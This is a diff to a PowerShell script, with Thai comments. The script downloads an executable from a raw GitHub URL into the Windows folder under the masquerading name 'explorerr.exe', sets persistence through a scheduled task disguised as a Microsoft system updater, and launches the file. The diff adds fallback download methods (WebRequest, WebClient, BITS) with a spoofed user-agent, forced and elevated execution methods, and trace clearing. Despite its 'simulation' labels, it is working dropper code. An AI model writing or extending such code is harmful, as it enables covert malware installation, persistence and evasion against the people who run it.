@@ -13,7 +13,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 $InstallPath = $env:windir
 $SexeDestination = Join-Path $InstallPath "explorerr.exe" 
-$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
+$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe" 
 $TaskName = "\Microsoft\Windows\SystemDataUpdater"
 
 function Write-SimulationProgress {
@@ -118,35 +118,162 @@ function Clear-Traces {
     Write-Host "System maintenance complete." -ForegroundColor Green
 }
 
+function Start-ForcedExecution {
+    param(
+        [string]$FilePath
+    )
+    
+    Write-Host "Starting forced execution with UI..." -ForegroundColor Yellow
+    
+    # วิธีที่ 1: พยายามรันปกติด้วย UI
+    try {
+        Write-Host "Attempting normal execution..." -ForegroundColor Cyan
+        Start-Process -FilePath $FilePath -WindowStyle Normal -PassThru -ErrorAction Stop
+        Write-Host "Program started successfully (Method 1)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Normal execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # วิธีที่ 2: รันด้วยสิทธิ์สูงสุด
+    try {
+        Write-Host "Attempting elevated execution..." -ForegroundColor Cyan
+        Start-Process -FilePath $FilePath -Verb RunAs -WindowStyle Normal -PassThru -ErrorAction Stop
+        Write-Host "Program started successfully (Method 2)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Elevated execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # วิธีที่ 3: ใช้ Process StartInfo
+    try {
+        Write-Host "Attempting via Process StartInfo..." -ForegroundColor Cyan
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo.FileName = $FilePath
+        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
+        $process.StartInfo.UseShellExecute = $true
+        $process.Start()
+        Write-Host "Program started successfully (Method 3)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Process StartInfo failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # วิธีที่ 4: ใช้ cmd.exe ในการรัน
+    try {
+        Write-Host "Attempting via CMD..." -ForegroundColor Cyan
+        $cmdArgs = "/c `"$FilePath`""
+        Start-Process -FilePath "cmd.exe" -ArgumentList $cmdArgs -WindowStyle Normal -PassThru
+        Write-Host "Program started successfully (Method 4)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "CMD execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    return $false
+}
+
+function Invoke-ForcedDownload {
+    param(
+        [string]$Url,
+        [string]$Destination
+    )
+    
+    Write-Host "Starting forced download..." -ForegroundColor Yellow
+    
+    # วิธีที่ 1: ใช้ Invoke-WebRequest ปกติ
+    try {
+        Write-Host "Downloading using Invoke-WebRequest..." -ForegroundColor Cyan
+        Invoke-WebRequest -Uri $Url -OutFile $Destination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
+        Write-Host "Download completed (Method 1)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Invoke-WebRequest failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # วิธีที่ 2: ใช้ WebClient
+    try {
+        Write-Host "Downloading using WebClient..." -ForegroundColor Cyan
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $webClient.DownloadFile($Url, $Destination)
+        Write-Host "Download completed (Method 2)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "WebClient failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    # วิธีที่ 3: ใช้ BITS
+    try {
+        Write-Host "Downloading using BITS..." -ForegroundColor Cyan
+        Start-BitsTransfer -Source $Url -Destination $Destination -ErrorAction Stop
+        Write-Host "Download completed (Method 3)." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "BITS transfer failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    
+    return $false
+}
+
 if ($choice -eq "1") {
     Write-Host "`nStarting operations..."
     
     Write-Host "Retrieving and preparing executable..."
     try {
-        Write-SimulationProgress -Message "Downloading file" -Duration 8 
-        $tempfile = Join-Path $env:TEMP "temp_download.exe"
-        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
-
-        Write-Host "Moving file to system location: $SexeDestination" -ForegroundColor Yellow
-        Move-Item -Path $tempfile -Destination $SexeDestination -Force
+        Write-SimulationProgress -Message "Downloading file" -Duration 8
         
-        Write-Host "Executable installation complete." -ForegroundColor Green
+        # ลบไฟล์เก่าถ้ามี
+        if (Test-Path $SexeDestination) {
+            Remove-Item $SexeDestination -Force -ErrorAction SilentlyContinue
+        }
+        
+        # บังคับดาวน์โหลด
+        $downloadSuccess = Invoke-ForcedDownload -Url $SexeUrl -Destination $SexeDestination
+        
+        if (-not $downloadSuccess) {
+            Write-Host "CRITICAL: All download methods failed!" -ForegroundColor Red
+            exit
+        }
+        
+        # ตรวจสอบว่าไฟล์ถูกดาวน์โหลดสำเร็จ
+        if (Test-Path $SexeDestination) {
+            $fileSize = (Get-Item $SexeDestination).Length
+            Write-Host "File downloaded successfully: $SexeDestination ($([math]::Round($fileSize/1MB, 2)) MB)" -ForegroundColor Green
+        } else {
+            Write-Host "ERROR: File not found after download!" -ForegroundColor Red
+            exit
+        }
+        
     } catch {
         Write-Host "Installation failed: $_" -ForegroundColor Red
         exit
     }
 
+    # สร้าง persistence
     Set-Persistence -PathToExe $SexeDestination
 
-    Write-Host "Executing core application..."
+    Write-Host "Executing core application with UI..."
     try {
-        Write-SimulationProgress -Message "Executing explorerr.exe" -Duration 3
-        Start-Process -FilePath $SexeDestination
-        Write-Host "Program started." -ForegroundColor Green
+        Write-SimulationProgress -Message "Launching application" -Duration 3
+        
+        # บังคับรันโปรแกรมด้วย UI
+        $executionSuccess = Start-ForcedExecution -FilePath $SexeDestination
+        
+        if ($executionSuccess) {
+            Write-Host "Application launched successfully with UI." -ForegroundColor Green
+            
+            # รอให้ UI โหลด
+            Write-SimulationProgress -Message "Waiting for UI to load" -Duration 3
+        } else {
+            Write-Host "WARNING: Some execution methods failed, but persistence is set." -ForegroundColor Yellow
+        }
+        
     } catch {
-        Write-Host "Execution failed: $." -ForegroundColor Red
+        Write-Host "Execution failed: $_" -ForegroundColor Red
     }
     
+    # ล้าง traces
     Clear-Traces
 
     Write-Host "`nInstallation completed successfully." -ForegroundColor Green
@@ -159,9 +286,21 @@ if ($choice -eq "1") {
     Write-Host "Stopping core application process..."
     try {
         Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
-        Stop-Process -Name "explorerr" -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2 
-        Write-Host "Process stop signal sent." -ForegroundColor Yellow
+        
+        # หยุดทุก process ที่เกี่ยวข้อง
+        Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" -or $_.MainWindowTitle -like "*explorerr*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+        
+        # รอให้ process ถูกปิด
+        Start-Sleep -Seconds 3
+        
+        # ตรวจสอบว่ายังมี process เหลืออยู่ไหม
+        $remainingProcesses = Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" }
+        if ($remainingProcesses) {
+            Write-Host "WARNING: Some processes still running. Forcing termination..." -ForegroundColor Red
+            $remainingProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
+        }
+        
+        Write-Host "All processes terminated." -ForegroundColor Green
     } catch {
         Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
     }
@@ -170,11 +309,27 @@ if ($choice -eq "1") {
     if (Test-Path $SexeDestination) {
         try {
             Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
-            Remove-Item $SexeDestination -Force
-            Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+            
+            # พยายามลบหลายครั้ง
+            for ($i = 1; $i -le 5; $i++) {
+                try {
+                    Remove-Item $SexeDestination -Force -ErrorAction Stop
+                    Write-Host "Removed executable: $SexeDestination (Attempt $i)" -ForegroundColor Green
+                    break
+                } catch {
+                    if ($i -eq 5) {
+                        Write-Host "ERROR: Could not remove file after 5 attempts. It may still be locked." -ForegroundColor Red
+                    } else {
+                        Write-Host "Attempt $i failed, retrying..." -ForegroundColor Yellow
+                        Start-Sleep -Seconds 2
+                    }
+                }
+            }
         } catch {
             Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
         }
+    } else {
+        Write-Host "File not found: $SexeDestination" -ForegroundColor Yellow
     }
     
     Write-Host "Cleanup completed." -ForegroundColor Green
